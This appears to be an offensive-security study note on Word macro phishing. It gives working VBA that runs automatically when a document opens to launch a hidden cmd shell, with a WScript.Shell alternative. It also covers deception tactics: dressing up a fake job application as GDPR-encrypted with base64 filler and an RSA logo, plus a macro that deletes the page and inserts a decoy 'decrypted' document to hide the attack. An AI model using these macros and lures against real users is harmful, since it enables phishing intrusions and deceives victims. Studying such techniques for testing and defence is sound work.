#### Microsoft Word Macros
- In Word, you can automate frequently used tasks by creating and running macros. A macro is **a series of commands and instructions** that you group together as a single command to accomplish a task automatically.
- This can be used by hackers in multiple ways.


#### Defining a variable in macro
Here's how we can define a variable in VBA:
```VBA
Dim myString As String
Dim myLong As Long
Dim myPointer As LongPtr
```
- String means unicode
- Long is for 64-bit integer
- Longptr is for a memory pointer


#### Creating a hidden cmd shell in macro
We can create a macro to open a hidden cmd shell with the following code:
```VBA
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    str = "cmd.exe"
    Shell str, vbHide
End Sub
```

^494c27

- Both Document_Open() and AutoOpen() functions are being used for redundancy.
- We can also place {CreateObject("Wscript.Shell").Run str, 0} in place of [Shell str, vbHide](Microsoft%20Office%20Phishing.md#^494c27) as an alternative to launch the shell

#### Appearances 
It is necessary for our microsoft macro shell to look legitimate to trick the person into using it, Following points should be taken into consideration while creating a word macro:
- A phishing attack exploits a victim's behavior, leveraging their curiosity or fear to encourage them to launch our payload despite their better judgement.
- If the document is poorly constructed, or seems like spam, they may alert support personnel, which could compromise our attack.

#### Setup and Execution
Hypothetically, we'll propose that the attached job application document is encrypted to protect its content in accordance with _GDPR_ regulations. If the victim does not have a strong technical background, these added terms and "tech magic" can make the document seem more legitimate. In this case, we'll simply add some random base64-encoded text and a note about GDPR compliance
To improve the perception of legitimacy, we can also add an RSA logo
When the victim enables our content, they will expect to see our "decrypted" content

We first create a fake decrypted document and then save it to autotext feature of word:
_Insert_ > _Quick Parts_ > _AutoTexts_ and _Save Selection to AutoText Gallery_

Now, we can proceed to create a fake decryption process

VBA code to setup a fake decryption process:
```VBA
Sub Document_Open()
    SubstitutePage
End Sub

Sub AutoOpen()
    SubstitutePage
End Sub

Sub SubstitutePage()
    ActiveDocument.Content.Select
    Selection.Delete
	ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert
	Where:=Selection.Range, RichText:=True
End Sub
```


